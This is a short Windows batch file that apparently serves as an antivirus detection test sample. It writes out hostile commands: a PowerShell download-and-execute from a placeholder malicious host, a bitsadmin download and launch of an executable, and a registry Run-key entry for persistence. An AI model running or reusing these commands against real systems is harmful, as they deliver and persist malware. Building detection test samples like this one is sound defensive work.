@echo off
REM Suspicious batch file for testing antivirus detection

REM Common malware patterns
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')"
bitsadmin /transfer myjob /download /priority high http://bad-domain.com/malware.exe %TEMP%\malware.exe
start %TEMP%\malware.exe

REM Registry modifications (suspicious)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d "%TEMP%\malware.exe" /f

REM Fake virus signatures
TROJAN_DETECTED
RANSOMWARE_PAYLOAD
KEYLOGGER_ACTIVE

echo This batch file contains patterns that should trigger antivirus alerts